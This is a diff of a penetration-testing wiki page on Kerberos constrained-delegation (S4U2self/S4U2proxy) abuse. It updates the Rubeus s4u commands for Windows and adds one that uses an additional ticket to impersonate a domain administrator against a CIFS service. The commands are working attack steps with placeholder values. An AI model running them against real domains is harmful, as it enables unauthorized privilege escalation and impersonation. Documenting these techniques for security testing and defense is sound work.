@@ -48,10 +48,10 @@ When attempting to exploit that technique, if the error above triggers, it means
 {% endtab %}
 
 {% tab title="Windows" %}
-From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose, to conduct a full S4U2 attack (S4U2self + S4U2proxy).
+From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used to conduct a full S4U2 attack (S4U2self + S4U2proxy).
 
 ```powershell
-.\Rubeus.exe s4u /msdsspn:"cifs/target" /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
+Rubeus.exe s4u /nowrap /msdsspn:"cifs/target" /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
 ```
 {% endtab %}
 {% endtabs %}
@@ -89,10 +89,10 @@ getST -spn "cifs/serviceA" -impersonate "administrator" "domain/serviceB:passwor
 {% endtab %}
 
 {% tab title="Windows" %}
-From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose, to conduct a full S4U2 attack (S4U2self + S4U2proxy).
+From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used to conduct a full S4U2 attack (S4U2self + S4U2proxy)
 
 ```powershell
-.\Rubeus.exe s4u /msdsspn:"cifs/target" /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
+Rubeus.exe s4u /nowrap /msdsspn:"cifs/target" /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
 ```
 {% endtab %}
 {% endtabs %}
@@ -111,7 +111,11 @@ getST -spn "cifs/target" -impersonate "administrator" -additional-ticket "admini
 {% endtab %}
 
 {% tab title="Windows" %}
-//TODO Rubeus
+From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used to obtain a Service Ticket through an S4U2proxy request, supplying as "additional ticket" the Service Ticket obtained before. &#x20;
+
+```powershell
+Rubeus.exe s4u /nowrap /msdsspn:"cifs/target" /impersonateuser:"administrator" /tgs:"base64 | file.kirbi" /domain:"domain" /user:"user" /password:"password"
+```
 {% endtab %}
 {% endtabs %}
 
